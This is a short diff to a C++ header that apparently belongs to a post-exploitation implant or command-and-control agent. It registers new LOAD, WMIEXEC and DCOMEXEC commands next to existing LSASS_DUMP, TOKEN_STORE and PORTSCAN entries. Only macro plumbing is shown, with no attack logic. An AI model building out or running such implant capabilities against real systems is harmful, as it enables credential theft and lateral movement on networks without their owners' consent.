@@ -408,6 +408,24 @@ namespace starburst {
   #define CMD_REG_INLINE_EXECUTE
 #endif
 
+#ifdef INCLUDE_CMD_LOAD
+  #define CMD_REG_LOAD { CMD_LOAD, cmd_load },
+#else
+  #define CMD_REG_LOAD
+#endif
+
+#ifdef INCLUDE_CMD_WMIEXEC
+  #define CMD_REG_WMIEXEC { CMD_WMIEXEC, cmd_wmiexec },
+#else
+  #define CMD_REG_WMIEXEC
+#endif
+
+#ifdef INCLUDE_CMD_DCOMEXEC
+  #define CMD_REG_DCOMEXEC { CMD_DCOMEXEC, cmd_dcomexec },
+#else
+  #define CMD_REG_DCOMEXEC
+#endif
+
 #define COMMAND_TABLE_ENTRIES \
     CMD_REG_EXIT              \
     CMD_REG_SLEEP             \
@@ -473,7 +491,10 @@ namespace starburst {
     CMD_REG_LSASS_DUMP        \
     CMD_REG_TOKEN_STORE       \
     CMD_REG_PORTSCAN          \
-    CMD_REG_INLINE_EXECUTE
+    CMD_REG_INLINE_EXECUTE    \
+    CMD_REG_LOAD              \
+    CMD_REG_WMIEXEC           \
+    CMD_REG_DCOMEXEC
 
 }
 
